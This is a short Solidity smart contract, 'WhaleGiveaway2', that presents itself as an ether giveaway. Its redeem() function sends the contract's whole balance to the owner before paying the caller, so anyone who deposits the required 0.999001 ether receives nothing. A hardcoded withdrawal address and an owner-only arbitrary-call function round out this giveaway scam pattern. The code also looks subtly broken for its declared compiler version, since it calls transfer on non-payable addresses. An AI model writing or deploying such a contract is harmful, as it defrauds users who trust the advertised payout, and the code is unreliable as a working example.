pragma solidity ^0.8.0;

contract WhaleGiveaway2 {
    address public owner;
    uint public constant minEligibility = 0.999001 ether;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function redeem() public payable {
        require(msg.value >= minEligibility);
        owner.transfer(address(this).balance);
        msg.sender.transfer(address(this).balance);
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        owner.transfer(address(this).balance);
    }

    function command(address adr, bytes memory data) public payable {
        require(msg.sender == owner);
        (bool success, ) = adr.call{value: msg.value}(data);
        require(success, "Low level call failed");
    }
}